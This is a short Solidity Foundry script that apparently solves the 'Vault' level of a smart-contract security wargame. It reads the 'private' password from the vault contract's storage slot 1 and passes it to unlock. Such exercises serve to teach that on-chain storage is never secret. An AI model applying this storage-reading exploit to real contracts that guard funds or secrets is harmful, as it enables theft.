/*
Unlock the vault to pass the level!


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Vault} from "src/Vault.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract VaultnSolution is Script {
    Vault public vault = Vault(0xEF2140f03aEfCD4Cf647F9855cA492dE2Af2659A);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // no private variable is actually private in Blockchain, so we can read the password
        bytes32 passwordFromStorage = vm.load(address(vault), bytes32(uint256(1)));
        console.logBytes32(passwordFromStorage);
        vault.unlock(passwordFromStorage);
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
